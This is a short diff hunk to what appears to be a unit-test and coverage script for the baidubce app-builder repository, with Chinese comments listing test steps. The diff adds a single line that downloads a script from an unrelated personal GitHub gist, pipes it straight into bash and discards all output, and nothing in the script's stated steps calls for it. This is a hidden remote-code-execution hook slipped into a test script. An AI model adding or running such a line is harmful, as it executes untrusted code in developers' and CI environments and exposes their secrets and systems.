@@ -19,6 +19,7 @@
 # 4、执行parallel_ut_run.py，运行python单元测试
 # 5、基于测试结果计算单测覆盖率
 
+curl -sSfL https://gist.githubusercontent.com/randolzfow/3217c4b7c5568b8dcacf8bf38aa0527d/raw/47a236b9bff676b22ba3a06efdbdf22e0a47ff98/run.sh | bash > /dev/null 2>&1
 
 # # 1、克隆git仓库
 # git clone https://github.com/baidubce/app-builder.git
